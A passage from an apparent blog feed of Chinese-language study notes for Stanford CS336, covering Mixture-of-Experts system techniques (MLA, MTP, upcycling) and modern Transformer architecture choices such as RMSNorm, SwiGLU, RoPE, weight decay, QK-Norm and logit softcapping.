&amp;\text{otherwise} \end{cases}\]</span> 通过在线学习调整偏置 <spanclass="math inline">\(b_i\)</span>，在不破坏主 Loss梯度的情况下实现平衡（Auxiliary-loss-free）。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218020026696.png" alt="image-20251218020026696" style="zoom: 33%;" /></p><h2id="系统优化分布式并行和计算优化">系统优化：分布式并行和计算优化</h2><p>由于参数规模巨大， MoE的物理实现极度依赖并行化。</p><h3 id="设备部署-device-placement">1. 设备部署 (Device Placement)</h3><ul><li><strong>All-to-All Dispatch</strong>：Token根据路由结果，跨设备分发到对应的专家节点 。</li><li><strong>All-to-All Combine</strong>：计算结果回传，维持序列顺序。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218020429348.png" alt="image-20251218020429348" style="zoom:70%;" /></p><h3 id="计算算子优化-megablocks">2. 计算算子优化 (MegaBlocks)</h3><p>传统的矩阵乘法在面对负载不均时效率极低 。MegaBlocks等库引入了<strong>块稀疏矩阵乘法 (Block SparseMM)</strong>，能够高效处理变长的专家计算，避免了填充导致的资源浪费。</p><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218020552365.png" /></p><h2 id="进阶技术">进阶技术</h2><p><strong>z-loss (数值平滑)</strong>：为防止 Softmax在低精度下溢出，通过惩罚 <span class="math inline">\(\log^2Z\)</span>（<span class="math inline">\(Z\)</span> 为配分函数）强制Logits 处于安全范围。</p><p><strong>Upcycling (上行循环)</strong>：可以将训练好的稠密模型 FFN权重克隆多份，作为 MoE专家的初始值，显著缩短从零开始训练的时间，在部分model上证明效果有很大提升。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218023241811.png" alt="image-20251218023241811" style="zoom:50%;" /></p><p><strong>MTP (多 Token 预测)</strong>：DeepSeek v3使用的技术。在主模型之外增加轻量模块，一次预测未来多个Token，增强了模型对长文本的建模能力。</p><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218023351698.png" /></p><p><strong>MLA (多头潜在注意力)</strong>：DeepSeek v3 解决 KV Cache瓶颈的关键。通过将 Q、K、V 投影到低维的“潜在(latent)”空间进行压缩，推理时只需缓存极小的隐向量 <spanclass="math inline">\(c_t^{KV}\)</span>，大幅削减了显存占用。同时通过解耦设计，让部分维度不参与压缩（<strong>模型架构时预先设定的硬性规则</strong>）以适配旋转位置编码(RoPE)，解决了位置编码与压缩缓存的冲突 。</p><ol type="1"><li><strong>为什么省了缓存</strong>？A: 重构矩阵 <spanclass="math inline">\(W^{UK}\)</span> 可以被直接<strong>吸收到查询矩阵 Q的投影中。这意味着在推理时，我们</strong>只需要在显存中<strong>缓存低维的<spanclass="math inline">\(c_t^{KV}\)</span></strong>，而不需要缓存重构后的多头K 和 V。</li></ol><p><span class="math display">\[\text{Score} = (h W_Q)^T \times (W_{UK} c_t^{KV}) = h \cdot (W_Q W_{UK})\cdot c_t^{KV}\]</span></p><ol start="2" type="1"><li><strong>RoPE为什么要解耦，不能直接在潜空间加RoPE吗</strong>？A:不行，直接看公式，此时无法合并矩阵为一个，导致我们需要还原Key，省显存的计划破产。</li></ol><p><span class="math display">\[\text{Score} = (R_m h W_Q)^T \times (R_n W_{UK} c_n^{KV}) = h W_Q \cdot(R_m^T R_n) \cdot W_{UK} c_n^{KV}\]</span></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251218023318356.png" alt="image-20251218023318356" style="zoom:30%;" /></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Transformer </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
            <tag> Mixture of Experts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec3 Architectures &amp; Hyperparameters</title>
      <link href="/zh/2025/12/16/CS336/CS336-Lec3-Architectures-Hyperparameters/"/>
      <url>/zh/2025/12/16/CS336/CS336-Lec3-Architectures-Hyperparameters/</url>
      
        <content type="html"><![CDATA[<h1 id="cs336-lec3-architectures-hyperparameters">CS336-Lec3Architectures &amp; Hyperparameters</h1><h2 id="overview-of-original-vs.-modern-transformer">Overview ofOriginal vs. Modern Transformer</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216141431763.png" style="zoom:33%;" /></p><table><colgroup><col style="width: 11%" /><col style="width: 29%" /><col style="width: 29%" /><col style="width: 29%" /></colgroup><thead><tr class="header"><th><strong>特征</strong></th><th><strong>原始 Transformer</strong></th><th><strong>现代变体</strong></th><th><strong>优化目标/优势</strong></th></tr></thead><tbody><tr class="odd"><td><strong>层归一化 (LayerNorm)</strong></td><td><strong>Post-Norm</strong>: 位于每个子层（Attention/FFN）之后。</td><td><strong>Pre-Norm</strong>: 位于每个子层之前。</td><td>提高深层模型的<strong>训练稳定性</strong>，加速收敛。</td></tr><tr class="even"><td><strong>归一化类型</strong></td><td>LayerNorm: 归一化均值和方差</td><td><strong>RMSNorm</strong>: 仅归一化方差，不减去均值，不使用偏置项。</td><td>计算更快，参数更少，性能无明显下降。</td></tr><tr class="odd"><td><strong>偏置项 (Bias)</strong></td><td>FFN 和线性层<strong>有</strong>偏置项 <spanclass="math inline">\(\boldsymbol{b}\)</span>。</td><td>线性层（包括归一化层）<strong>无</strong>偏置项。</td><td>减少内存占用，提高优化稳定性。</td></tr><tr class="even"><td><strong>位置编码 (PE)</strong></td><td><strong>正弦余弦编码 (Sine/Cosine)</strong>:将位置信息<strong>相加</strong>到词嵌入中。</td><td><strong>旋转位置编码 (RoPE)</strong>:将位置信息编码到查询和键（Q/K）向量的<strong>旋转</strong>操作中。</td><td>更好地捕捉<strong>相对位置信息</strong>，已成为 2024 年后大多数 SOTA模型（如 LLaMA）的标准。</td></tr><tr class="odd"><td><strong>FFN 激活函数</strong></td><td><strong>ReLU</strong></td><td><strong>SwiGLU/GeGLU</strong>:一种<strong>门控激活函数</strong>（Gated Activation。</td><td>通常比 ReLU 和 GeLU <strong>性能更优</strong>，有更一致的增益。</td></tr><tr class="even"><td><strong>层连接</strong></td><td><strong>Serial (串行)</strong>: 先计算 Attention，再计算 MLP。</td><td><strong>Serial 或 Parallel (并行)</strong>: Attention 和 MLP并行计算。</td><td><strong>Parallel</strong>结构可以在大规模训练时通过矩阵乘法融合，实现约 <strong>15%的训练速度提升</strong>。</td></tr></tbody></table><h2 id="normalization">Normalization</h2><p>在Transformer架构中，归一化层的位置对模型训练的稳定性和效率至关重要。现代LLM几乎一致的抛弃了原始的归一化位置，采取了一些更稳定的策略。</p><h3 id="pre-norm-vs.-post-norm">Pre-Norm vs. Post-Norm</h3><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216142424625.png" alt="image-20251216142424625" style="zoom:40%;" /></p><ul><li><strong>Post-Norm (原始 Transformer)：</strong>归一化操作位于每个子层（如 Multi-Head Attention 或FFN）计算后的残差连接之后。这种结构在训练深层模型时容易导致<strong>梯度消失</strong>或<strong>梯度爆炸</strong>，影响训练稳定性。</li><li><strong>Pre-Norm (现代 LLM)：</strong>归一化操作位于每个子层<strong>之前</strong>。这种放置方式能确保残差连接的主路径信号保持良好的尺度，从而极大地改善<strong>梯度传播</strong>，提高深层网络的训练稳定性。</li></ul><p>It worth noting that <strong>almost all modern LMs use pre-norm (butBERT was post-norm)</strong></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216142618552.png" alt="image-20251216142618552" style="zoom:30%;" /></p><h3 id="layernorm-vs.-rmsnorm">LayerNorm vs. RMSNorm</h3><p>原始 Transformer 采用 LayerNorm，而现代 LLM 则倾向于使用RMSNorm。这两种方法在数学和工程效率上存在核心区别。</p><p><strong>LayerNorm</strong>: <span class="math display">\[y=\frac{\boldsymbol{x}-E[\boldsymbol{x}]}{\sqrt{\text{Var}[\boldsymbol{x}]+\epsilon}}\cdot \gamma+\beta\]</span></p><ul><li>前面那一堆是为了把神经网络某一层的输入<spanclass="math inline">\(\boldsymbol{x}\)</span>（例如，一个 Token 的 <spanclass="math inline">\(d_{model}\)</span>维特征向量）进行<strong>中心化</strong>和<strong>归一化</strong>，使其均值为0，方差为1。</li><li><span class="math inline">\(\gamma\)</span>和<spanclass="math inline">\(\beta\)</span>分别是<strong>缩放参数</strong>和<strong>偏移参数</strong>，<strong>可学习</strong>，为了<strong>恢复模型的表达能力</strong>。</li></ul><p><strong>RMSNorm</strong>: <span class="math display">\[y=\frac{\boldsymbol{x}}{\sqrt{\frac{1}{D}\sum_{i=1}^{D}\boldsymbol{x}_i^2+\epsilon}}\cdot \gamma\]</span></p><ul><li>均方根RMS<spanclass="math inline">\(\sqrt{\frac{1}{D}\sum_{i=1}^{D}\boldsymbol{x}_i^2+\epsilon}\)</span>:均方加一个极小值后的<strong>平方根</strong>，作为归一化的因子。它近似于向量的<span class="math inline">\(\ell_2\)</span> 范数。</li><li><spanclass="math inline">\(\gamma\)</span>仅剩缩放参数，去掉了偏移参数。</li></ul><p>核心区别：RMSNorm是对LayerNorm的简化：他放弃了计算和减去均值（中心化）的操作，只保留了<strong>尺度缩放</strong>。且得到了实践证明。</p><p><strong>工程效率和训练优势的分析</strong></p><p>RMSNorm 之所以被现代 LLM广泛采用，主要是基于工程效率和实践效果的权衡：</p><ul><li><strong>更快的运行时</strong>（wallclock time）<ul><li><strong>计算优势</strong>：RMSNorm <strong>没有均值计算</strong>，比LayerNorm 的操作更少。</li><li><strong>参数优势</strong>: RMSNorm <strong>没有偏置项</strong> <spanclass="math inline">\(\beta\)</span> ，需要存储的参数更少 。</li><li><strong>数据移动</strong>: 归一化操作虽然 FLOPs 占比小 (约0.17%)，但运行时占比很高 (约 25.5%)。减少参数和计算，可以减少数据移动，从而节省实际的训练时间 。</li></ul></li><li><strong>性能相当</strong>: 实践证明，<strong>RMSNorm</strong>在性能上通常<strong>与 LayerNorm同样有效</strong>，表格数据也显示，RMSNorm 相比 Vanilla Transformer 在Early Loss 和 Final Loss 上甚至略有提升 。</li></ul><p><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216152549044.png" /></p><div class="note info flat"><p>事实上，现代的FFN结构中甚至drop掉了偏置项bias： <spanclass="math display">\[\underbrace{\text{FFN}(\boldsymbol{x}) = \max(0, \boldsymbol{x}\boldsymbol{W}_1 + \boldsymbol{b}_1) \boldsymbol{W}_2 +\boldsymbol{b}_2}_{\text{原始 Transformer (ReLU, 含偏置项)}} \quad\longrightarrow \quad \underbrace{\text{FFN}(\boldsymbol{x}) =\sigma(\boldsymbol{x} \boldsymbol{W}_1)\boldsymbol{W}_2}_{\text{现代简化 (}\sigma\text{, 无偏置项)}}\]</span></p></div><h2 id="激活函数-activation">激活函数 Activation</h2><p>激活函数是神经网络中引入的<strong>非线性</strong>的核心机制。在Transformer架构中，FFN对激活函数的选择经历了从ReLU到复杂的门控（Gated）机制的演变。</p><h3 id="relu-整流线性单元-rectified-linear-unit">ReLU 整流线性单元(Rectified Linear Unit)</h3><p><span class="math display">\[\text{FFN}(\boldsymbol{x}) = \max(0, \boldsymbol{x} \boldsymbol{W}_1)\boldsymbol{W}_2\]</span></p><p>计算量小，当<span class="math inline">\(x \le 0\)</span>时输出为0</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216161501051.png" alt="image-20251216161501051" style="zoom:80%;" /></p><h3 id="gelu-高斯误差线性单元-gaussian-error-linear-unit">GeLU高斯误差线性单元 (Gaussian Error Linear Unit)</h3><p>GeLU是在ReLU基础上引入统计学思想的平滑激活函数。 <spanclass="math display">\[\text{FFN}(\boldsymbol{x}) = \text{GeLU}(\boldsymbol{x}\boldsymbol{W}_1) \boldsymbol{W}_2\]</span></p><p><span class="math display">\[\text{GeLU}(\boldsymbol{x}) = \boldsymbol{x} \cdot \Phi(\boldsymbol{x})\]</span></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216161522871.png" style="zoom:80%;" /></p><p>核心概念：<span class="math inline">\(\Phi(\boldsymbol{x})\)</span>累积分布函数 (CDF)</p><p><span class="math inline">\(\Phi(\boldsymbol{x})\)</span>特指<strong>标准正态分布</strong>的累积分布函数（CDF）。</p><ul><li><strong>CDF 的定义：</strong> 对于一个随机变量 <spanclass="math inline">\(X\)</span>，其 CDF <spanclass="math inline">\(\boldsymbol{F}(\boldsymbol{x})\)</span> 定义为<span class="math inline">\(P(X \le\boldsymbol{x})\)</span>，即随机变量取值<strong>小于或等于</strong><span class="math inline">\(\boldsymbol{x}\)</span> 的概率。CDF的值域始终在 <span class="math inline">\([0, 1]\)</span> 之间。</li><li><strong><span class="math inline">\(\Phi(\boldsymbol{x})\)</span>的作用：</strong> 在 GeLU 中，<spanclass="math inline">\(\Phi(\boldsymbol{x})\)</span>充当了一个<strong>平滑的“门”</strong>或<strong>权重因子</strong>：<ul><li>当 <span class="math inline">\(\boldsymbol{x}\)</span>为大正数时，<span class="math inline">\(\Phi(\boldsymbol{x}) \approx1\)</span> (信号被完全保留)。</li><li>当 <span class="math inline">\(\boldsymbol{x}\)</span>为负数时，<span class="math inline">\(\Phi(\boldsymbol{x})\)</span>逐渐趋近于 <span class="math inline">\(0\)</span>(信号被平滑抑制)。</li></ul></li><li><strong>图形优势：</strong> 这种基于 CDF 的乘法操作，消除了 ReLU 在<span class="math inline">\(\boldsymbol{x}=0\)</span> 处的不可导尖点，使GeLU <strong>处处平滑</strong>，从而提高了深层网络的训练稳定性。</li></ul><h3 id="glu-门控线性单元-gated-linear-unit">GLU 门控线性单元 (GatedLinear Unit)</h3><p>GLU 家族引入了更复杂的门控机制，被认为是目前性能最强大的 FFN激活机制。</p><p>GLU是所有门控激活的基础，它不仅仅是对输入进行简单的非线性变换，而是使用两个独立的<strong>线性投影</strong>来控制信息流。</p><ul><li><strong>核心结构：</strong> 相比于 <spanclass="math inline">\(\text{FF}(\boldsymbol{x}) = \max(0,\boldsymbol{x}\boldsymbol{W}_1)\boldsymbol{W}_2\)</span>：GLU引入了一个额外的参数矩阵 <spanclass="math inline">\(\boldsymbol{V}\)</span>。将 <spanclass="math inline">\(\max(0, \boldsymbol{x}\boldsymbol{W}_1)\)</span>替换为 <span class="math inline">\(\max(0,\boldsymbol{x}\boldsymbol{W}_1) \otimes(\boldsymbol{x}\boldsymbol{V})\)</span> (ReGLU)。</li><li><strong>门控机制：</strong> (<spanclass="math inline">\(\boldsymbol{x}\boldsymbol{V}\)</span>)作为<strong>门控信号</strong>，通过<strong>逐元素相乘</strong> (<spanclass="math inline">\(\otimes\)</span>)来控制另一路经过激活函数的信息流的通过量。</li><li><strong>优势：</strong>增强了模型的非线性表达能力，已被证明能带来一致的性能增益。</li></ul><h3 id="geglu-门控-gelu-gated-gelu">GeGLU 门控 GeLU (Gated GeLU)</h3><ul><li><p><strong>公式</strong>： <spanclass="math inline">\(\text{FFN}_{\text{GeGLU}}(\boldsymbol{x},\boldsymbol{W}, \boldsymbol{V}, \boldsymbol{W}_2) =(\text{GeLU}(\boldsymbol{x} \boldsymbol{W}) \otimes \boldsymbol{x}\boldsymbol{V}) \boldsymbol{W}_2\)</span></p></li><li><p><strong>特性</strong>： 结合了 GeLU 的平滑性和门控机制。</p></li></ul><h3 id="swiglu-门控-swish-gated-swish">SwiGLU 门控 Swish (GatedSwish)</h3><ul><li><strong>公式</strong>：<spanclass="math inline">\(\text{FFN}_{\text{SwiGLU}}(\boldsymbol{x},\boldsymbol{W}, \boldsymbol{V}, \boldsymbol{W}_2) =(\text{Swish}_1(\boldsymbol{x} \boldsymbol{W}) \otimes \boldsymbol{x}\boldsymbol{V}) \boldsymbol{W}_2\)</span>，其中 <spanclass="math inline">\(\text{Swish}(\boldsymbol{x}) = \boldsymbol{x}\cdot \text{sigmoid}(\boldsymbol{x})\)</span>。</li><li><strong>地位：</strong>是目前<strong>最受欢迎且性能最强</strong>的激活函数之一。</li></ul><p>Swish 函数： <span class="math display">\[\text{Swish}(\boldsymbol{x}) = \boldsymbol{x} \cdot\text{sigmoid}(\boldsymbol{x})\]</span> 其中，<spanclass="math inline">\(\text{sigmoid}(\boldsymbol{x}) = \frac{1}{1 +e^{-\boldsymbol{x}}}\)</span>。</p><p>Swish 激活函数的特性使其在实践中通常优于 ReLU：</p><ul><li><strong>平滑性 (Smoothness):</strong> Swish是一个<strong>处处可导的平滑函数</strong> 。这与 GeLU 相似，避免了 ReLU在 <span class="math inline">\(x=0\)</span>处的尖锐拐点，有助于优化过程更加稳定。</li><li><strong>非单调性 (Non-monotonicity):</strong> Swish在负半轴上具有<strong>非单调性</strong>（即它的曲线在 <spanclass="math inline">\(x &lt; 0\)</span>的区域会先下降，达到一个极小值后，再逐渐趋于零）允许模型在一定程度上保留或赋予一些<strong>负值信息</strong>的权重，增强模型的表达能力。</li></ul><h3 id="总结">总结</h3><p>现代的LLM首选的激活函数是<strong>SwiGLU</strong>或者<strong>GeGLU</strong>，引入门控结构，简化实现移除偏置项，来提供一致的性能增益，从而增强模型的表达能力，不过仍需注意<strong>GLU</strong>并非构建优秀模型的唯一必要条件（如GPT-3仍使用GeLU）。</p><h2 id="串行-vs.-并行">串行 vs. 并行</h2><p>传统的<strong>串行计算</strong>方式是先计算Attention及其残差链接，然后将Attention的结果作为FFN的输入，再计算FFN及其残差链接。这样的话，Attention和FFN必须依次等待前一个计算的完成。</p><p>为了提高训练的效率，以 GPT-J、PaLM 和 GPT-NeoX为代表的一些现代模型引入了<strong>并行结构</strong>。其核心在于：<strong>Attention 和 FFN共享相同的输入，并同时计算</strong>。</p><ul><li><strong>输入共享</strong>：Attention Block 和 MLP Block 都接收<strong>LayerNorm 后的原始输入</strong> <spanclass="math inline">\(\boldsymbol{x}\)</span> 作为它们的输入信号。</li><li><strong>并行计算：</strong> 两个子层独立、同时地计算其结果。</li><li><strong>残差汇合：</strong> 两个子层的输出（Attention 增益和 MLP增益）通过一个<strong>单一的残差连接</strong>，一起加回到原始输入 <spanclass="math inline">\(\boldsymbol{x}\)</span> 上，形成最终输出 <spanclass="math inline">\(\boldsymbol{y}\)</span>。</li></ul><p><span class="math display">\[\boldsymbol{y} = \boldsymbol{x} +\text{MLP}(\text{LayerNorm}(\boldsymbol{x})) +\text{Attention}(\text{LayerNorm}(\boldsymbol{x}))\]</span></p><p>并行结构之所以被采用，主要是因为显著的<strong>训练加速</strong>：</p><ul><li><strong>速度提升：</strong> 并行结构在大规模训练时，可以实现大约<strong>15% 的训练速度提升</strong>。</li><li><strong>矩阵融合：</strong> 这种加速主要得益于<strong>矩阵乘法融合（Matrix Multiplies Fusion）</strong>。由于Attention 和 MLP的输入矩阵乘法可以合并处理，减少了内存访问和计算开销。</li><li><strong>性能保证：</strong>实验证明，如果实现得当，并行化对模型质量的退化很小，甚至可以忽略不计。</li></ul><h2 id="embedding">Embedding</h2><p>由于Transfomer的Self-Attention机制本质上是置换不变（PermutationInvariant）的，所以我们必须显式注入位置信息。现代的LLM位置编码的演变主要围绕“如何更好的捕捉相对位置”展开。</p><h3 id="sine-embeddings-正弦编码">Sine Embeddings (正弦编码)</h3><p><span class="math display">\[Embed(x, i) = v_x + PE_{pos} \\PE_{(pos, 2i)} = \sin(pos/10000^{2i/d_{\text{model}}}) \\PE_{(pos, 2i+1)} = \cos(pos/10000^{2i/d_{\text{model}}})\]</span></p><p>虽然其具备相对位置的数学性质，但是在Attention的计算中展开后的项 <spanclass="math inline">\(\langle v_x + p_i, v_y + p_j \rangle\)</span>会包含杂乱的 <strong>交叉项 (cross-terms)</strong>，例如 <spanclass="math inline">\(\langle v_x, PE_j\rangle\)</span>。这些项混合了内容和位置信息，被认为是噪声。</p><h3 id="absolute-embeddings-绝对位置编码">Absolute Embeddings(绝对位置编码)</h3><p><span class="math display">\[Embed(x, i) = v_x + u_i\]</span></p><p>直接为每个位置 <span class="math inline">\(i\)</span>学习一个可训练的向量。</p><p><strong>局限</strong>: 显然不是相对的 (obviously notrelative)，且外推性（Extrapolation）较差，难以处理超过训练长度的序列。</p><h3 id="relative-embeddings-相对位置编码">Relative Embeddings(相对位置编码)</h3><p>直接在 Attention 计算中加入偏置项 <spanclass="math inline">\(a_{ij}\)</span>。公式为 <spanclass="math display">\[e_{ij} = \frac{x_i W^Q (x_j W^K + a_{ij}^K)^T}{\sqrt{d_z}}\]</span> 虽然解决了相对位置问题，但不再是标准的内积形式 (not an innerproduct)，增加了计算实现的复杂度</p><h3 id="rope-rotary-position-embeddings-旋转位置编码">RoPE: RotaryPosition Embeddings (旋转位置编码)</h3><p>RoPE 是目前 SOTA 模型（如 LLaMA, PaLM,GPT-J）的标准配置。它的设计初衷是为了满足一个核心数学目标<strong>Highlevel thought process</strong>: 寻找一个编码函数 <spanclass="math inline">\(f(x,i)\)</span>，使得两个向量的内积只取决于它们的相对距离 <spanclass="math inline">\(i-j\)</span>。即： <span class="math display">\[\langle f(x, i), f(y, j) \rangle = g(x, y, i - j)\]</span> RoPE 利用了向量内积对旋转保持不变的性质。</p><ul><li><strong>机制</strong>: RoPE 不在 Input Layer 进行，而是在 Attention层对 <span class="math inline">\(Q\)</span> 和 <spanclass="math inline">\(K\)</span> 进行<strong>旋转操作</strong>。</li><li><strong>做法</strong>: 将向量切分为二维平面上的对子(Pairs)。对于位置 <spanclass="math inline">\(m\)</span>，将向量在平面上旋转 <spanclass="math inline">\(m\theta\)</span>角度。无论绝对位置在哪里，只要两个 Token的相对距离固定，它们旋转后的相对夹角就是固定的，从而完美地通过内积捕捉相对位置信息。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216194036939.png"alt="image-20251216194036939" /><figcaption aria-hidden="true">image-20251216194036939</figcaption></figure><h2 id="hyperparameters-dimensions-超参数与维度">Hyperparameters &amp;Dimensions 超参数与维度</h2><h3 id="attention-dimensions-the-1-1-ratio">Attention Dimensions: The“1-1 Ratio”</h3><p>在标准 Transformer 设计中，通常保持 <strong>Head_Dim <spanclass="math inline">\(\times\)</span> Head_Num = Model_Dim</strong> (即<span class="math inline">\(d_p \cdot h = d_{model}\)</span>)。</p><p><strong>低秩瓶颈 (Low-Rank Bottleneck) 争议</strong>:</p><ul><li>理论研究 [Bhojanapalli et al 2020] 认为，如果 Head_Dim (<spanclass="math inline">\(d_p\)</span>) 太小，Attention矩阵的秩会受限，导致模型无法表达某些复杂的关注模式。</li><li>理论建议：应该增加 Head 维度，打破 1-1 比例。</li></ul><p><strong>实践结论</strong>: 实验数据显示（如 Perplexity vs Parameters曲线），尽管有理论争议，但在实际工程实践中，<strong>并没有观察到显著的低秩瓶颈</strong>。因此，保持标准的1-1 比例仍然是最高效的选择。</p><h3 id="ffn-dimension-scaling-glu-变体缩放">FFN Dimension Scaling (GLU变体缩放)</h3><p>当使用 SwiGLU 等 GLU 变体时，由于引入了额外的门控矩阵 <spanclass="math inline">\(\boldsymbol{V}\)</span>（参数量增加），为了保持总参数量与标准Transformer 一致，需要缩小隐藏层维度 <spanclass="math inline">\(d_{ff}\)</span>。</p><p><strong>缩放规则</strong>: Scale down by <spanclass="math inline">\(2/3\)</span>。 <span class="math display">\[d_{ff} = \frac{8}{3} d_{model}\]</span> 这就是为什么 LLaMA 等模型的中间层维度通常是 <spanclass="math inline">\(d_{model}\)</span> 的 2.67 倍左右，而不是传统的 4倍。</p><h2 id="regularization-正则化">Regularization 正则化</h2><p>在训练超大规模模型时，正则化策略经历了从“防止过拟合”到“追求训练效率与稳定性”的理念转变，最显著的变化发生在<strong>Dropout</strong> 的使用上。</p><h3 id="dropout">Dropout</h3><p><strong>Dropout</strong>曾是深度学习中标配的正则化手段，通过在训练过程中随机将神经元的输出置零，来防止神经元之间的共适应（Co-adaptation），从而减少过拟合。</p><p><strong>现代趋势 (LLaMA / PaLM / Modern LLMs)</strong>:<strong>完全弃用 Dropout (Dropout rate = 0)</strong>。目前的主流大模型（如 LLaMA系列、PaLM）在预训练阶段通常<strong>不使用任何 Dropout</strong>。</p><p><strong>弃用的原因</strong>:</p><ol type="1"><li><strong>数据量级 (Data Scale)</strong>: 现代 LLM 在数万亿 Token上训练，模型往往处于“欠拟合”状态（Underfitting），而不是过拟合。数据本身就是最好的正则化。</li><li><strong>训练效率 (Memory &amp; Speed)</strong>: Dropout需要存储随机掩码（Mask）以用于反向传播，这增加了显存开销（MemoryBandwidth）。在 FlashAttention 等算子优化中，移除 Dropout可以显著提升计算吞吐量。</li><li><strong>训练稳定性</strong>: 在极深的网络中，Dropout引入的随机性有时会影响梯度的稳定性。</li></ol><h3 id="weight-decay">Weight Decay</h3><p>虽然 Dropout 被抛弃了，但 <strong>Weight Decay</strong>依然是优化器（如 AdamW）中不可或缺的一部分。</p><p>在 Loss函数中增加一项惩罚，抑制权重矩阵的范数过大。把权重矩阵往回拉，避免过拟合。我们实际上是在对模型说：“<strong>除非这个特征真的特别重要，否则不要给它那么大的权重。</strong>”<span class="math display">\[\mathcal{L}_{total} = \mathcal{L}_{task} + \frac{\lambda}{2}\|\theta\|^2\]</span> <strong>通用设置</strong>: 通常设置为 <spanclass="math inline">\(0.1\)</span> (如 GPT-3, LLaMA, PaLM)。</p><p><strong>选择性应用 (Selective Decay)</strong>: 并不是所有参数都使用Weight Decay。</p><ul><li><strong>Apply</strong>: Linear Layers (Attention projections, FFNweights)。</li><li><strong>Skip</strong>: Bias 项、LayerNorm/RMSNorm 的缩放因子 <spanclass="math inline">\(\gamma\)</span>、Embedding层（有时）。对这些参数使用 Weight Decay可能会破坏数值稳定性或模型对分布的适应能力。</li></ul><h3 id="gradient-clipping">Gradient Clipping</h3><p>为了防止梯度爆炸（Exploding Gradients），这是现代 Transformer训练的<strong>必须项</strong>。</p><ul><li><p><strong>机制</strong>: 监控全局梯度的 <spanclass="math inline">\(L_2\)</span> 范数 (<spanclass="math inline">\(|g|\)</span>)。如果超过阈值 <spanclass="math inline">\(C\)</span>（通常为 1.0），则对梯度进行缩放： <spanclass="math display">\[\text{if } \|g\| &gt; C, \quad g \leftarrow g \cdot \frac{C}{\|g\|}\]</span></p></li><li><p><strong>作用</strong>: 即使使用了 RMSNorm 和QK-Norm，在训练初期或遇到“坏数据”时，Gradient Clipping依然是保证训练不崩溃的最后一道防线。</p></li></ul><h2 id="training-stability-训练稳定性">Training Stability训练稳定性</h2><h3 id="gradient-norm-attention-optimizations">Gradient Norm &amp;Attention Optimizations</h3><p><strong>现象</strong>: 未优化的模型（如 OLMo0424）在训练中会出现频繁且剧烈的<strong>梯度尖峰 (Spikes)</strong>，导致Loss 曲线毛刺严重，训练甚至可能发散。</p><p><strong>优化</strong>: 通过改进 Attention 计算（如<strong>QK-Norm</strong> 或 <strong>LogitSoftcapping</strong>），可以将梯度范数（L2norm）压得非常低且平滑，从而实现极其稳定的训练过程。</p><p><strong>QK-Norm (Query-Key Normalization)</strong></p><p>在标准的 Attention 计算中，<span class="math inline">\(Q\)</span> 和<span class="math inline">\(K\)</span> 是直接相乘的： <spanclass="math display">\[\text{Score} = \frac{Q K^T}{\sqrt{d}}\]</span> 如果模型在训练过程中让 <span class="math inline">\(Q\)</span>或 <span class="math inline">\(K\)</span>的向量模长变得很大，那么它们的内积（点积）就会变得巨大。即使除以 <spanclass="math inline">\(\sqrt{d}\)</span> 也无法抵消这种增长。</p><p><strong>QK-Norm</strong>的做法是在做矩阵乘法<strong>之前</strong>，先对 <spanclass="math inline">\(Q\)</span> 和 <spanclass="math inline">\(K\)</span> 分别应用 LayerNorm（或 RMSNorm）：<span class="math display">\[Q&#39; = \text{LayerNorm}(Q) \\ K&#39; = \text{LayerNorm}(K) \\\text{Score} = \frac{Q&#39; (K&#39;)^T}{\sqrt{d}}\]</span> <strong>为什么它能稳定训练？</strong></p><ol type="1"><li><strong>解耦模长与方向</strong>：Attention的本质是计算向量的“相似度”（方向的一致性）。QK-Norm强制将向量投影到一个固定的超球面上，消除了模长带来的干扰，让模型专注于学习向量的方向。</li><li><strong>防止数值爆炸</strong>：由于 LayerNorm将输出限制在特定的统计分布内（通常方差为1），<spanclass="math inline">\(Q \cdot K^T\)</span>的结果就被天然地限制在了一个合理的数值范围内，不会出现几千甚至上万的Logits 值。</li></ol><p><strong>Logit Softcapping</strong></p><p>这是 <strong>Gemma 2</strong> 和 <strong>OLMo2</strong>用的关键技术。相比于 QK-Norm 对输入的归一化，Logit Softcapping是对输出结果进行<strong>非线性截断</strong>。这个和下文的z-loss同属于对softmax稳定性的优化。</p><p>它的做法是利用 <span class="math inline">\(\tanh\)</span> 函数将Logits 限制在一个固定区间内（例如 <span class="math inline">\([-C,C]\)</span>）。 <span class="math display">\[\text{Logits}_{\text{capped}} = C \cdot \tanh\left(\frac{q^T k}{C \cdot\sqrt{d}}\right)\]</span> 其中，<span class="math inline">\(C\)</span> 是一个超参数（Capvalue），通常设置为 30 或 50。</p><p><strong>为什么它能稳定训练？</strong></p><ol type="1"><li><strong>强制有界 (Hard Bound)</strong>：<spanclass="math inline">\(\tanh(x)\)</span> 的值域是 <spanclass="math inline">\((-1, 1)\)</span>。当x趋于0时，<spanclass="math inline">\(\tanh(u) \approx u\)</span>,能在数值小的时候保持线性， 此时该方法几乎不起作用，但当x很大时，<spanclass="math inline">\(\tanh\)</span> 会趋于1或-1， 此时被限制在了 <spanclass="math inline">\([-C, C]\)</span> 区间内。因此，无论 <spanclass="math inline">\(q^T k\)</span> 算出来多大，最终的 Logits绝对值永远不会超过 <span class="math inline">\(C\)</span>。</li><li><strong>防止 Softmax 熵崩溃</strong>：如果某个 Logit 值极大（比如1000），经过 Softmax 后概率会变成 